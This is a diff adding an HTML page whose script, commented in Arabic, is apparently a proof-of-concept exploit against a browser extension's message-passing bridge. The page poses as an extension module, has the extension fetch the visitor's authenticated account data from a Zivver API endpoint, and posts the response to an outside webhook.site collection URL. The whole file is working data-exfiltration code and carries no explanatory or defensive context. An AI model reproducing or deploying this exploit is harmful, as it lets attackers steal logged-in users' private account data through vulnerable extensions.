@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+/* 1️⃣ نعمل MessageChannel */
+const channel = new MessageChannel();
+
+/* 2️⃣ نستقبل الرد من الـ extension */
+channel.port1.onmessage = e => {
+  fetch(
+    "https://webhook.site/e7ce7b30-c642-425c-b186-818f0992458d",
+    {
+      method: "POST",
+      body: JSON.stringify(e.data)
+    }
+  );
+};
+
+/* 3️⃣ نبعث handshake للـ extension */
+window.postMessage({
+  type: "ext-corb-workaround_port",
+  moduleId: "1f24 e53a",
+  port: channel.port2
+}, "*", [channel.port2]);
+
+/* 4️⃣ نطلب XHR من extension */
+channel.port1.postMessage({
+  type: "NEW_XHR",
+  id: 1
+});
+
+channel.port1.postMessage({
+  type: "SET",
+  id: 1,
+  prop: "responseType",
+  value: "text"
+});
+
+channel.port1.postMessage({
+  type: "CALL",
+  id: 1,
+  method: "open",
+  args: ["GET", "https://app.zivver.com/api/me", true]
+});
+
+channel.port1.postMessage({
+  type: "CALL",
+  id: 1,
+  method: "send",
+  args: []
+});
+</script>
+</body>
+</html>
